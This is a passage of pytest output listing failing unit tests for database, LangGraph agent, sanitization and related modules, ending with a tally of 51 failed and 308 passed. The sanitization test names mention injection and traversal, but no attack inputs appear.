+FAILED tests/unit/test_database_service.py::TestDatabaseServiceSessionManagement::test_get_session_sqlalchemy_error_handling
+FAILED tests/unit/test_database_service.py::TestDatabaseServiceSessionManagement::test_get_session_generic_error_handling
+FAILED tests/unit/test_database_service.py::TestDatabaseServiceHealthCheck::test_health_check_healthy
+FAILED tests/unit/test_database_service.py::TestDatabaseServiceHealthCheck::test_health_check_initializes_if_needed
+FAILED tests/unit/test_database_service.py::TestDatabaseServiceErrorHandling::test_session_error_during_operation
+FAILED tests/unit/test_database_service.py::TestDatabaseServiceErrorHandling::test_connection_recovery_after_operational_error
+FAILED tests/unit/test_database_service.py::TestDatabaseServiceConfigurationVariants::test_debug_mode_configuration
+FAILED tests/unit/test_database_service.py::TestDatabaseServiceConfigurationVariants::test_production_mode_configuration
+FAILED tests/unit/test_database_service.py::TestDatabaseServiceAdvancedOperations::test_create_user_with_duplicate_email
+FAILED tests/unit/test_database_service.py::TestDatabaseServiceAdvancedOperations::test_database_transaction_rollback
+FAILED tests/unit/test_database_service.py::TestDatabaseServiceAdvancedOperations::test_database_connection_timeout
+FAILED tests/unit/test_database_service.py::TestDatabaseServiceLegacyMethods::test_get_session_maker_method
+FAILED tests/unit/test_error_monitoring.py::TestErrorMonitorEdgeCases::test_window_edge_case_exactly_at_cutoff
+FAILED tests/unit/test_exceptions.py::TestBoardroomException::test_boardroom_exception_basic
+FAILED tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_get_model_kwargs_development
+FAILED tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_get_model_kwargs_production
+FAILED tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_chat_success
+FAILED tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_chat_with_token_usage
+FAILED tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_chat_llm_error_retry
+FAILED tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_chat_max_retries_exceeded
+FAILED tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_tool_call_tool_not_found
+FAILED tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_create_graph_success
+FAILED tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_create_graph_no_checkpointer
+FAILED tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_get_response_success
+FAILED tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_get_stream_response
+FAILED tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_get_chat_history
+FAILED tests/unit/test_langgraph_graph.py::TestLangGraphAgent::test_clear_chat_history
+FAILED tests/unit/test_meeting_management_tools.py::TestCreateMeetingAgendaTool::test_time_allocation_calculation
+FAILED tests/unit/test_sanitization.py::TestSanitizeString::test_sanitize_string_remove_script_tags
+FAILED tests/unit/test_sanitization.py::TestSanitizeString::test_sanitize_string_remove_null_bytes
+FAILED tests/unit/test_sanitization.py::TestSanitizeEmail::test_sanitize_email_invalid_format
+FAILED tests/unit/test_sanitization.py::TestSanitizeFilename::test_sanitize_filename_path_traversal
+FAILED tests/unit/test_sanitization.py::TestSanitizeSqlLikePattern::test_sanitize_sql_like_pattern_normal
+FAILED tests/unit/test_sanitization.py::TestSanitizeUrl::test_sanitize_url_dangerous_schemes
+FAILED tests/unit/test_sanitization.py::TestSanitizeUrl::test_sanitize_url_malformed
+FAILED tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_string_advanced_xss_attempts
+FAILED tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_string_sql_injection_attempts
+FAILED tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_string_command_injection_attempts
+FAILED tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_string_empty_and_whitespace
+FAILED tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_dict_deep_nesting_attack
+FAILED tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_filename_path_traversal_variants
+FAILED tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_validate_password_strength_comprehensive
+FAILED tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_validate_uuid_string_format_variations
+FAILED tests/unit/test_sanitization.py::TestSanitizationEdgeCases::test_sanitize_url_comprehensive_attacks
+FAILED tests/unit/test_security_schemas.py::TestRotationPolicy::test_rotation_policy_edge_cases
+FAILED tests/unit/test_workflow.py::TestWorkflowModule::test_workflow_initialization
+================ 51 failed, 308 passed, 103 warnings in 31.59s =================
